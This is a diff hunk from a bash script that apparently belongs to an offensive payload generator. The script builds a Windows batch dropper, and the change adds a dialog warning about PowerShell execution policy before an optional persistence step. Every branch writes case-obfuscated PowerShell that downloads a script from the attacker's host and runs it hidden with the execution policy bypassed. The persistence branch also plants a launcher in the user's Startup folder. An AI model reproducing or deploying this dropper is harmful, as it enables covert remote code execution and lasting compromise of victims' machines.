@@ -12370,12 +12370,20 @@ if [ "$persistence" = "No (default)" ]; then
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
 else
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
-   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
-   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   PS_warning=$(zenity --list --title "☠ WARNING: POWERSHELL EXECUTION POLICY ☠" --text "For this method to work TARGET system needs to have is\nPowershell Execution Policy set to 'RemoteSigned' or else\nthe powershell agent will not auto-execute on startup\n\nDo you wish to continue or to use default payload?" --radiolist --column "Pick" --column "Option" TRUE "Use default payload (no persistence)" FALSE "Add persistence (continue)" --width 370 --height 200) > /dev/null 2>&1
+   if [ "$PS_warning" = "Add persistence (continue)" ]; then
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
+      echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+      echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+      echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+      echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   else
+      echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+      echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+      echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+      echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   fi
 fi
 
 
